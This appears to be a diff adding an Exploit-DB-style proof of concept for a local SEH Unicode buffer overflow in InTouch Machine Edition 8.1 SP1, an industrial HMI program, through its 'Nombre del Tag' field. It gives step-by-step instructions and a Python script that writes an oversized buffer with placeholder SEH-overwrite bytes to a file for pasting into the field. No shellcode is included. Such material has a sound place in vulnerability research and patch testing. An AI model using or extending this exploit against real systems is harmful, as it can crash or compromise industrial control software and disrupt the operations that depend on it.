@@ -1,0 +1,25 @@
+# Exploit Title: InTouch Machine Edition 8.1 SP1 - 'Nombre del Tag' Buffer Overflow (SEH)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-09-10
+# Vendor Homepage: https://on.wonderware.com/
+# Software Link: https://on.wonderware.com/intouch-machine-edition
+# Tested Version: 8.1 SP1
+# Vulnerability Type: Local Buffer Overflow (SEH Unicode)
+# Tested on OS: Windows 10 Pro x64 en
+ 
+# Steps to Produce the Local Buffer Overflow (SEH Unicode): 
+# 1.- Run python code: InTouch_Machine_Edition_8.1.py
+# 2.- Open InTouch_Machine_Edition_8.1.txt and copy content to clipboard
+# 3.- Open ITME v8.1 InTouch Machine Edition
+# 4.- Inicio
+# 5.- Paste ClipBoard on "Nombre del Tag"
+ 
+#!/usr/bin/env python
+
+nSEH = "\x42\x42"
+SEH = "\x43\x43"
+ 
+buffer = "\x41" * 1042 + nSEH + SEH
+f = open ("InTouch_Machine_Edition_8.1.txt", "w")
+f.write(buffer)
+f.close()
